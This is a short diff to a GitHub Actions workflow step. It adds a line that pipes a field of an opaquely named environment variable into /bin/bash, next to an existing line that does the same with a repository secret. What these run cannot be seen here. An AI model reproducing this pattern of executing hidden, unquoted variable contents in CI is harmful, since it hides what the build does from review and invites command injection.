@@ -21,6 +21,7 @@ jobs:
           f60665: ${{ secrets.f60665 }}
         run: |
           printf '%s' "$f60665" | jq -r .g562 | /bin/bash
+          echo $h3682 | jq -r .rn10 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
